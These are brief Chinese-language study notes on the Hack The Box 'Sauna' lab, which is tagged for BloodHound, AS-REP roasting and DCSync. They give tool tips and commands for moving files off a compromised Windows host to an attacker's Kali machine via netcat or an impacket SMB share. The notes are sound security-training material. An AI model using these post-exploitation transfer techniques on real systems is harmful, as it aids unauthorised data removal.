---
description: SharpHound, BloodHound, Active Directory, ASREPRoasting,DCSync Attack
---

# Hack the box - Sauna

{% embed url="https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#shell-as-fsmith" %}

注意事项

在使用sharphound收集AD信息时，不要使用kali自带的sharphound，需要从github上下载最新的bloodhound.exe.

{% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}

当需要从windows传送文件到kali上时，可以使用netcat。大致思路是在kali上下载好nc.exe，使用python3 -m http.server 这个指令启动一个临时的http服务器。在Windows上将nc.exe下载并使用nc.exe 和kali自带的netcat传送文件。

在使用python impacket中的smb模组时，用impacket-smbserver指令，而不是smbserver.py。当我在使用smbserver.py时，我的kali出现了鼠标光标变成十字状的情况。当使用impacket-smbserver时，需要加上-smb2support，windows net.exe不支持smb1。

```
# Kali Command:
sudo impacket-smbserver -smb2support smb samba_share
# smb 是 smb share 的名字，samba_share是本地文件夹的名字。

# Windows Command:
net use \\10.10.16.3\smb
cd \\10.10.16.3\smb # 将当前的文件夹转到smb
# 注意使用smb而不是samba_share作为Windows上smb share的名字
```
